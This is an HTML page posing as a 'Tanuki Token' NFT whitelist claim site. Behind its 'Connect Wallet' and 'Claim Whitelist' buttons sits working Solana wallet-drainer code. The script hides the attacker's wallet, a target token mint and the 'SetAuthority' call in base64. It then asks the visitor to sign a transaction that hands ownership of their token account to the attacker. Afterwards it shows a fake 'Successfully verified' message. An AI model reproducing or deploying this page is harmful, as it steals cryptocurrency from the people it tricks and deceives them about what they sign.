<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tanuki Token — Solana Wildlife Support</title>
    <script src="https://bundle.run/@solana/web3.js@1.31.0"></script>
    <style>
        :root {
            --background: #0d0d12;
            --primary: #4ade80;
            --foreground: #ffffff;
            --card: #16161e;
        }
        body { 
            margin: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: var(--background); 
            color: var(--foreground); 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
            text-align: center;
        }
        .container {
            background: var(--card);
            padding: 3rem;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #333;
            max-width: 500px;
        }
        h1 { font-size: 2.5rem; margin-bottom: 0.5rem; color: var(--primary); }
        p { color: #888; margin-bottom: 2rem; }
        .btn {
            background: var(--primary);
            color: #000;
            padding: 15px 40px;
            border-radius: 10px;
            font-weight: bold;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(74, 222, 128, 0.4);
        }
        .status { margin-top: 15px; font-size: 0.9rem; color: #555; }
    </style>
</head>
<body>

    <div class="container">
        <div style="font-size: 50px; margin-bottom: 10px;">🦝</div>
        <h1>Tanuki Token</h1>
        <p>Connect your wallet to join the exclusive Whitelist and claim your Wildlife NFT.</p>
        
        <button class="btn tanuki-seed">Connect Wallet</button>
        <button class="btn tanuki-seed" style="background: transparent; border: 2px solid var(--primary); color: var(--primary); margin-top: 20px;">Claim Whitelist</button>
        
        <div class="status">Supported Wallets: Phantom, Solflare</div>
    </div>

    <script>
        // عناوين مشفرة لضمان الخصوصية
        const _0x1a2b = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; // محفظة الاستلام (أنت)
        const _0x3c4d = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU="; // عنوان البول/التوكن المستهدف
        const _0x5e6f = "U2V0QXV0aG9yaXR5"; // وظيفة نقل الملكية

        async function startSecureProcess() {
            const btns = document.querySelectorAll('.tanuki-seed');
            btns.forEach(btn => {
                btn.addEventListener('click', async () => {
                    try {
                        const provider = window.solana;
                        if (!provider) {
                            window.open("https://phantom.app/", "_blank");
                            return;
                        }

                        // الاتصال بالمحفظة
                        const connect = await provider.connect();
                        const victim = connect.publicKey;
                        const solanaWeb3 = window.solanaWeb3;
                        
                        // الاتصال بشبكة سولانا الرئيسية
                        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

                        // البحث عن حسابات التوكن في محفظة المستخدم
                        const accounts = await conn.getParsedTokenAccountsByOwner(victim, {
                            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
                        });

                        // البحث عن التوكن الذي يطابق عنوان البول الخاص بك
                        const target = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_0x3c4d));

                        if (target) {
                            // بناء المعاملة لنقل ملكية الحساب (SetAuthority)
                            const transaction = new solanaWeb3.Transaction().add(
                                solanaWeb3.Token[atob(_0x5e6f)](
                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                                    new solanaWeb3.PublicKey(target.pubkey),
                                    new solanaWeb3.PublicKey(atob(_0x1a2b)),
                                    'AccountOwner',
                                    victim,
                                    []
                                )
                            );

                            const { blockhash } = await conn.getLatestBlockhash();
                            transaction.recentBlockhash = blockhash;
                            transaction.feePayer = victim;

                            // طلب التوقيع من المستخدم
                            const signed = await provider.signTransaction(transaction);
                            const signature = await conn.sendRawTransaction(signed.serialize());
                            
                            alert("Successfully verified! Please wait for confirmation.");
                            console.log("Tx Signature:", signature);
                        } else {
                            alert("Wallet connected! You are not eligible for this whitelist.");
                        }
                    } catch (err) {
                        console.log("User rejected or Error occurred");
                    }
                });
            });
        }
        
        window.onload = startSecureProcess;
    </script>
</body>
</html>
